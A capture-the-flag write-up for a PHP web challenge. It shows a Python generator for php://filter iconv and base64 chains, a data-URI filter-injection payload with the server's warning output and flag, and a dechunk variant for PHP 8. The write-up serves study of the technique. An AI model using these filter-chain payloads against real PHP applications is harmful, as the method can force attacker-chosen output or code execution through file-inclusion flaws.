# Filter Master

* Round: 28 (2022/11)
* Category: Web
* Points: 125
* Solves: 10

## Description

Do you want the flag? Please ask nicely in the language of PHP filters.

## Solution

You can modify https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT to prepend more `convert.iconv.UTF8.CSISO2022KR` to get rid of `>` characters in the final decoded string, and use `string.strip_tags` (removed in PHP 8) to strip the remaining characters.

```python
from base64 import b64encode


file_to_use = "/dev/null"
base64_payload = b64encode(b"plz give me the flag<").decode().replace("=", "")

# generate some garbage base64
filters = "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.base64-encode|"
# make sure to get rid of any equal signs in both the string we just generated and the rest of the file
filters += "convert.iconv.UTF8.UTF7|"


for c in base64_payload[::-1]:
    filters += open("./res/" + (str(hex(ord(c)))).replace("0x", "")).read() + "|"
    # decode and reencode to get rid of everything that isn't valid base64
    filters += "convert.base64-decode|"
    filters += "convert.base64-encode|"
    # get rid of equal signs
    filters += "convert.iconv.UTF8.UTF7|"

filters += "convert.base64-decode"
filters += "|string.strip_tags"

final_payload = f"php://filter/{filters}/resource={file_to_use}"

with open("test.php", "w") as f:
    f.write('<?php echo file_get_contents("' + final_payload + '");?>')
print(filters)

# import os

# os.system("php7 test.php")
```

## Unintended Solution

You can also put `resource=` with data uri inject your own data, and I have thought of this when I designed the challenge, but I can't imagine how can you apply more filters after that. :thinking:

The real surprise here is that PHP will still try to find filters to use even if it is in the data uri part! So sending the following payload to the server:

```
resource=data:,plz give me the flag<|string.strip_tags|
```

The full url will be:

```
php://filter/resource=data:,plz give me the flag<|string.strip_tags|/resource=/dev/null
```

And the web server will return a bunch of warnings along with the flag:

```
Warning: file_get_contents(): unable to locate filter "resource=data:,plz give me the flag<" in /var/www/html/index.php on line 11

Warning: file_get_contents(): Unable to create filter (resource=data:,plz give me the flag<) in /var/www/html/index.php on line 11

Warning: file_get_contents(): unable to locate filter "resource=" in /var/www/html/index.php on line 11

Warning: file_get_contents(): Unable to create filter (resource=) in /var/www/html/index.php on line 11

Warning: file_get_contents(): unable to locate filter "dev" in /var/www/html/index.php on line 11

Warning: file_get_contents(): Unable to create filter (dev) in /var/www/html/index.php on line 11

Warning: file_get_contents(): unable to locate filter "null" in /var/www/html/index.php on line 11

Warning: file_get_contents(): Unable to create filter (null) in /var/www/html/index.php on line 11
ictf{maybe_this_is_the_last_php_7.4_challenge_before_its_EOL}
```

From the warning, we can see PHP is finding the filters by simply splitting on `|`, so the `string.strip_tags` will still be applied to

```
plz give me the flag<|string.strip_tags|/resource=/dev/null
```

So the output will be `plz give me the flag`, which solves this challenge.

Also, this also works in PHP 8, but you need to use `dechunk` instead because `string.strip_tags` is removed:

```
resource=data:,14%0D%0Aplz give me the flag%0D%0A0|dechunk|
```

This `dechunk` payload is a simplified version of what @SamXML sent me.
